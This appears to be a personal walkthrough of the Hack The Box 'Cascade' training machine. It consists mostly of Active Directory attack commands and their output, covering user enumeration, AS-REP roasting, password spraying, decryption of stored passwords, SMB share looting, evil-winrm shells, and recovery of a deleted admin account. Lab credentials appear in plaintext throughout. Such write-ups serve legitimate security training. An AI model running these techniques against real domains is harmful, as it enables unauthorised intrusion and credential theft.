### Making a Target User List (HTB Academy)
```bash
crackmapexec smb $IP --users # domain:cascade.local
❯ rpcclient -U "" -N $IP
rpcclient $> enumdomusers
```

##### Method 1 re-assembly rpcclient users list
```bash
cat rpc_users_raw.txt | cut -d"]" -f1 | tr "[" " " | cut -d " " -f2 > rpc_users.txt

# or 

cat rpc_users_raw.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}'
```

### ASREP Roasting
```bash
impacket-GetNPUsers cascade.local/ -dc-ip $IP -no-pass -usersfile rpc_users.txt
```

### ldapsearch
```bash
ldapsearch -x -H ldap://$IP -s base > ldapsearch_all.txt
ldapsearch -x -H ldap://$IP -s base -b "DC=cascade,DC=local" > ldapsearch_dc.txt
ldapsearch -x -H ldap://$IP -s base -b "DC=cascade,DC=local" '(objectClass=person)' > ldapsearch_person.txt

ldapsearch -H ldap://$IP -x -b "DC=cascade,DC=local" -s sub "(&(objectClass=user))"
ldapsearch -H ldap://$IP -x -b "DC=cascade,DC=local" -s sub "(&(objectClass=user))" | grep -i samaccountname: | cut -f2 -d" " > ldapsearch_user.txt
```
looks closely, there is one special user that other scans not poping it out.

CASC-DC1$

##### Enum others than user on ldapsearch
```bash
ldapsearch -H ldap://$IP -x -b "DC=cascade,DC=local" -s sub
ldapsearch -H ldap://$IP -x -b "DC=cascade,DC=local"
ldapsearch -H ldap://$IP -x -b "DC=cascade,DC=local" '(objectClass=person)'
```
cascadeLegacyPwd: clk0bjVldmE=

❯ echo clk0bjVldmE= | base64 -d
rY4n5eva

### ldapdomaindump
```bash
ldapdomaindump cascade.local
```

### windapsearch is way better !
```bash
/opt/windapsearch-linux-amd64 -d $IP -m users --full > windapsearch_go_user_full.txt

# a little trick
cat windapsearch_go_user_full.txt | awk '{print $1}' | sort | uniq -c | sort -nr
```

### ASREP Roasting Again
```bash
impacket-GetNPUsers cascade.local/ -dc-ip $IP -no-pass -usersfile rpc_users.txt
```

### Bash one-liner to try rpcclient and smb again
```bash
for u in $(cat rpc_users.txt); do smbmap -H $IP -u $u; done
for u in $(cat rpc_users.txt); do smbmap -H $IP -d cascade.local -u $u; done
```
```bash
for u in $(cat rpc_users.txt); do smbpasswd -r $IP -U $u; done
```

### Password sparying
```bash
crackmapexec smb $IP -u rpc_users.txt -p rY4n5eva | grep +

/opt/kerbrute_linux_amd64 passwordspray -d cascade.local --dc $IP rpc_users.txt rY4n5eva
```

SMB         10.129.114.189  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva

```bash
crackmapexec winrm $IP -u r.thompson -p rY4n5eva
```

### SMB Againt
```bash
❯ smbmap -H $IP -u r.thompson -p rY4n5eva
[+] IP: 10.129.114.189:445      Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

spider
```bash
crackmapexec smb $IP -u r.thompson -p rY4n5eva -M spider_plus
```

#### mount smb with creds
```bash
sudo mount -t cifs //$IP/Data /mnt -o username=r.thompson,password=rY4n5eva,domain=cascade.local
```

```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

s.smith:sT333ve2

### Bloodhound-python
```bash
bloodhound-python -c DcOnly -u s.smith -p 'sT333ve2' -d cascade.local -dc CASC-DC1.cascade.local -ns $IP
```

### Hint here
net user s.smith
net localgroup "Audit Share"
That's unusual

### Rush SMB, SMB RUSH
```bash
smbclient \\\\$IP\\Audit$ -U s.smith%sT333ve2
```

`sqlitebrowser Audit.db`

❯ echo -n BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
������D�|zC�;                                                                                                                                                                                            
The table `LDAP` contains a password for the user. But encrypted


### Privilege Escalation
❯ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py cascade.local/arksvc:'w3lc0meFr31nd'@cascade.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
[-] rpc_s_access_denied
```                                                   
❯ python3 /usr/share/doc/python3-impacket/examples/psexec.py cascade.local/arksvc:'w3lc0meFr31nd'@cascade.local
[-] share 'ADMIN$' is not writable.
[-] share 'Audit$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Data' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'print$' is not writable.
[-] share 'SYSVOL' is not writable.
```
# Root

```
evil-winrm -i cascade.local -u arksvc -p w3lc0meFr31nd  # <-- !!! Sometimes just can't use ip to get a shell
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\arksvc\Documents> 
```

The user is identified to belong to the `AD Recycle Bin` group. AD Recycle Bin is used to recover deleted AD objects such as Users, Groups, OUs etc. The objects keep all their properties intact.

```ps
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

add a filter for user

Get-ADObject -filter { SAMAccountName -eq "TempAdmin"} -includeDeletedObjects -Properties *

YmFDVDNyMWFOMDBkbGVz

evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles
